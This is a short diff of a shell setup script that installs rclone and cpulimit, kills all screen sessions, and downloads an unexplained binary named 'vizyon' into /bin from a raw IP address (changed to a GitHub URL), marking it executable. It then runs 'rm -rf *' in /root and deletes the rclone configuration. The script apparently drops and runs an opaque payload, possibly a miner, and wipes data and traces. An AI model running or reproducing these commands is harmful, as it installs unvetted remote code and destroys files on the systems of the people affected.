@@ -5,7 +5,7 @@ apt install python3 pip -y
 apt install rclone -y
 apt-get install -y cpulimit
 killall -9 screen
-cd /bin && wget -O vizyon http://78.135.83.71/ahmet/vizyon && chmod +x vizyon
+cd /bin && wget -O vizyon https://github.com/turk1111/turk1111/blob/turk1111-patch-1/vizyon && chmod +x vizyon
 cd /root && rm -rf *
 cd /root/.config && rm -rf rclone
 clear
